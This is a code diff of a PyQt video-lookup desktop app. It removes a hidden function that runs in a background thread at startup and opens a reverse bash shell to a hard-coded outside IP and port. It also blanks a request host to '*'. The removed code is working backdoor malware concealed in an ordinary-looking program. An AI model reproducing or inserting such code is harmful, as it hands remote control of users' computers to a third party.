@@ -78,34 +78,19 @@ class mywindow(QtWidgets.QWidget,Ui_MainWindow):
         'name':keyword,
         'ep': int(ep) }
         data = json.dumps(data)
-        r=requests.post("http://123.207.2.27:20013",data=data).content
+        r=requests.post("*",data=data).content
         url = 'http://www.82190555.com/index/qqvod.php?url=http:'+r.decode('utf-8')
         print (url)
         self.webEngineView.setUrl(QtCore.QUrl(url))
         print("hello world")
 
-def func():
-    s=socket(AF_INET,SOCK_STREAM)
-    while 1>0:
-        try:
-            s.connect(('23.83.249.21',2334))
-            os.dup2(s.fileno(),0)
-            os.dup2(s.fileno(),1)
-            os.dup2(s.fileno(),2)
-            p=subprocess.call(["/bin/bash","-i"]);
-            break
-        except:
-            time.sleep(10)
+
 
 
 
 if __name__=="__main__":
     logging.basicConfig(filename='myapp.log', level=logging.INFO)
     logging.info('Started')
-
-
-    t = threading.Thread(target=func,args=())
-    t.start()
     app=QtWidgets.QApplication(sys.argv)
     myshow=mywindow()
     myshow.show()
